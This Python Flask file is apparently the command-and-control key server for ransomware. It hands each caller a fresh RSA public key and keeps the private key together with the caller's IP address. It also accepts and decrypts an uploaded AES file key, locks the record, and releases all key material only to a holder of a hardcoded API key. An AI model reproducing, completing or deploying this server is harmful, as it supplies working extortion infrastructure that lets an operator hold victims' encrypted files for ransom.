import base64
import os
import sqlite3
import time
import uuid

import flask

import common

DATABASE = os.environ.get("DATABASE", "./keys.db")

SECRET_KEY = os.environ.get(
    "SECRET_KEY", "I6zajP^!JaKAjbBdYS(R#SwAMIDSh^A^aQDH^q3QjCLTG*CTSSn^HfaC6((Dr5D^"
)

app = flask.Flask(__name__)


def get_db() -> sqlite3.Connection:
    db = getattr(flask.g, "_database", None)
    if db is None:
        db = flask.g._database = sqlite3.connect(DATABASE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(flask.g, "_database", None)
    if db is not None:
        db.close()


@app.route("/keys", methods=["POST"])
def generate_key():
    ip = flask.request.remote_addr

    unique_id = uuid.uuid4()

    private_key = common.generate_private_key()

    private_key_pem, public_key_pem = common.get_pair(private_key)

    db = get_db()

    db.execute(
        "INSERT INTO `keys` (uuid, private_key, ip, created_at) VALUES (?, ?, ?, ?)",
        (str(unique_id), private_key_pem, ip, int(time.time())),
    )
    db.commit()

    return {
        "uuid": unique_id,
        "public_key": public_key_pem.decode(),
    }


@app.route("/keys/<unique_id>", methods=["PATCH"])
def update_key(unique_id: str):
    aes_key = flask.request.json.get("aes_key")
    aes_iv = flask.request.json.get("aes_iv")

    if not aes_key or not aes_iv:
        return "Missing aes_key or aes_iv", 400

    aes_key = base64.b64decode(aes_key)
    aes_iv = base64.b64decode(aes_iv)

    db = get_db()

    cursor = db.execute(
        "SELECT private_key FROM `keys` WHERE uuid = ? AND locked = ?",
        (unique_id, 0),
    )

    private_key_pem = cursor.fetchone()

    if private_key_pem is None:
        return "Invalid ID or already locked", 400

    private_key = common.load_private_key(private_key_pem[0])
    decrypted_aes_key = common.decrypt_key(aes_key, private_key)

    db.execute(
        "UPDATE `keys` SET aes_key = ?, aes_iv = ?, locked = ? WHERE uuid = ?",
        (decrypted_aes_key, aes_iv, 1, unique_id),
    )
    db.commit()

    if db.total_changes != 1:
        return "Failed to update key", 400

    return "OK"


@app.route("/keys/<unique_id>", methods=["GET"])
def get_key(unique_id: str):
    if flask.request.headers.get("X-Api-Key") != SECRET_KEY:
        return "Invalid API key", 403

    db = get_db()

    cursor = db.execute(
        "SELECT private_key, aes_key, aes_iv FROM `keys` WHERE uuid = ?",
        (unique_id,),
    )

    private_key_pem = cursor.fetchone()

    if private_key_pem is None:
        return "Invalid ID", 404

    return {
        "private_key": private_key_pem[0].decode(),
        "aes_key": private_key_pem[1].decode(),
        "aes_iv": private_key_pem[2].decode(),
    }


if __name__ == "__main__":
    app.run(debug=True, port=8000)
